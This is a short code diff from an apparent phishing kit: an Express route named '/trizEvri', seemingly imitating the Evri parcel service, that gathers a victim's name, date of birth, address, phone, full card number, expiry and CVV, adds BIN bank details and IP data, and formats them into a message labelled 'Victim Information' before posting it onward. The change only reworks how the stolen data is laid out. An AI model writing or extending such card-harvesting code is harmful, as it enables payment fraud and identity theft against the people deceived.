@@ -10427,12 +10427,11 @@ app.post("/trizEvri", (req, res) => {
       if (!resp.data.bank) {
         bankName = "";
       } else {
-        bankName = resp.data.bank.name;
+        binL = `${bin} | ${resp.data.scheme} | ${resp.data.type} | ${resp.data.brand} | ${resp.data.bank.name}`;
       }
     })
     .then(function () {
-      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binL}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\nUser Agent: ${userAgent}`;
 
       axios
         .post(
